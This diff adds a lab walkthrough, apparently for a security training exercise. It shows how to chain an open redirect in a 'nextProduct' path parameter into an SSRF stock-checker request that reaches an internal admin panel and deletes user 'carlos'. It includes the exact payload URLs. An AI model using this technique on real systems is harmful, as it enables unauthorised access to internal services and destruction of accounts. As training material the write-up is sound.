@@ -1,0 +1,362 @@
+================================================================================
+         LAB: SSRF Filter Bypass via Open Redirection Vulnerability
+================================================================================
+
+Objective
+---------
+Access the internal admin interface:
+
+    http://192.168.0.12:8080/admin
+
+Then delete the user:
+
+    carlos
+
+The stock checker only allows requests to the local application.
+To bypass this restriction, exploit an Open Redirect vulnerability.
+
+================================================================================
+STEP 1 - Visit Product Page
+================================================================================
+
+          +--------------------------------------+
+          |          Product Web Page            |
+          |                                      |
+          |     [ Check Stock ]  <-- Click       |
+          +--------------------------------------+
+                        |
+                        |
+                        V
+
+================================================================================
+STEP 2 - Capture Request in Burp Suite
+================================================================================
+
+Browser
+   |
+   V
++-------------------+
+| Burp Proxy        |
+| Intercept ON      |
++-------------------+
+          |
+          V
+
+Captured Request
+
+GET /product/stock HTTP/1.1
+
+stockApi=/product/stock/check
+
+
+          |
+          |
+          V
+
+Right Click
+      |
+      +----> Send to Repeater
+
+================================================================================
+STEP 3 - Try Direct SSRF
+================================================================================
+
+Modify
+
+stockApi=http://192.168.0.12:8080/admin
+
+
+          |
+          |
+          V
+
+Send Request
+
+Response
+
+❌ Blocked
+
+Observation
+
+The stock checker only allows requests
+to its own application.
+
+External/internal hosts are rejected.
+
+================================================================================
+STEP 4 - Find an Open Redirect
+================================================================================
+
+Click
+
+Next Product
+
+            |
+            |
+            V
+
+Browser URL
+
+/product/nextProduct?path=/product?productId=2
+
+
+Intercept or inspect the response.
+
+================================================================================
+STEP 5 - Observe the Redirect
+================================================================================
+
+Server Response
+
+HTTP/1.1 302 Found
+
+Location:
+
+/product?productId=2
+
+
+Observation
+
+The value of the
+
+path
+
+parameter is copied directly into the
+
+Location
+
+header.
+
+This creates an Open Redirect vulnerability.
+
+================================================================================
+STEP 6 - Exploit the Open Redirect
+================================================================================
+
+Craft the following URL
+
+/product/nextProduct?path=http://192.168.0.12:8080/admin
+
+
+Visual Flow
+
+Stock Checker
+      |
+      |
+      V
+
+/product/nextProduct
+          |
+          |
+          V
+
+HTTP 302 Redirect
+Location:
+http://192.168.0.12:8080/admin
+          |
+          |
+          V
+
+Stock Checker Follows Redirect
+          |
+          |
+          V
+
+Internal Admin Interface
+
+================================================================================
+STEP 7 - Use Redirect in stockApi
+================================================================================
+
+Replace stockApi with
+
+/product/nextProduct?path=http://192.168.0.12:8080/admin
+
+
+          |
+          |
+          V
+
+Send Request
+
+Response
+
+✔ Admin Page Returned
+
+================================================================================
+STEP 8 - Delete User Carlos
+================================================================================
+
+Modify Payload
+
+/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+
+          |
+          |
+          V
+
+Send Request
+
+================================================================================
+STEP 9 - Success
+================================================================================
+
+Server follows redirect
+
+            |
+            V
+
+http://192.168.0.12:8080/admin/delete?username=carlos
+
+            |
+            V
+
+User
+
+carlos
+
+Deleted
+
+================================================================================
+COMPLETE ATTACK FLOW
+================================================================================
+
+                 User
+                   |
+                   V
+          Open Product Page
+                   |
+                   V
+          Click Check Stock
+                   |
+                   V
+          Burp Proxy Capture
+                   |
+                   V
+         Send to Repeater
+                   |
+                   V
+     Try Direct Internal URL
+                   |
+             ❌ Blocked
+                   |
+                   V
+      Inspect "Next Product"
+                   |
+                   V
+ Discover Open Redirect
+
+/product/nextProduct?path=
+
+                   |
+                   V
+ Create Redirect Payload
+
+/product/nextProduct?path=
+http://192.168.0.12:8080/admin
+
+                   |
+                   V
+      Put into stockApi
+                   |
+                   V
+    Stock Checker Requests
+       Local Application
+                   |
+                   V
+ Local App Responds 302 Redirect
+                   |
+                   V
+Redirect to Internal Admin Server
+                   |
+                   V
+ Stock Checker Follows Redirect
+                   |
+                   V
+ Internal Admin Interface
+                   |
+                   V
+ Modify Payload
+
+/product/nextProduct?path=
+http://192.168.0.12:8080/admin/delete?username=carlos
+
+                   |
+                   V
+          Send Request
+                   |
+                   V
+     ✔ User "carlos" Deleted
+                   |
+                   V
+            ✔ Lab Solved
+
+================================================================================
+EXPLOIT SUMMARY
+================================================================================
+
+Direct SSRF
+-----------
+http://192.168.0.12:8080/admin
+
+Status
+------
+❌ Blocked
+
+
+Open Redirect
+-------------
+/product/nextProduct?path=http://192.168.0.12:8080/admin
+
+Status
+------
+✔ Allowed
+
+
+Delete Carlos
+-------------
+/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+================================================================================
+VISUAL REPRESENTATION
+================================================================================
+
+                 stockApi
+                    |
+                    V
+
++--------------------------------------------+
+| /product/nextProduct?path=http://...       |
++--------------------------------------------+
+                    |
+                    V
+
+        Local Application (Allowed)
+                    |
+                    | 302 Redirect
+                    V
+
++--------------------------------------------+
+| Location: http://192.168.0.12:8080/admin   |
++--------------------------------------------+
+                    |
+                    V
+
+     Stock Checker Automatically Follows
+                    |
+                    V
+
++--------------------------------------------+
+| Internal Admin Interface                   |
++--------------------------------------------+
+                    |
+                    V
+
+/admin/delete?username=carlos
+                    |
+                    V
+
+         ✔ Lab Completed Successfully
+
+================================================================================
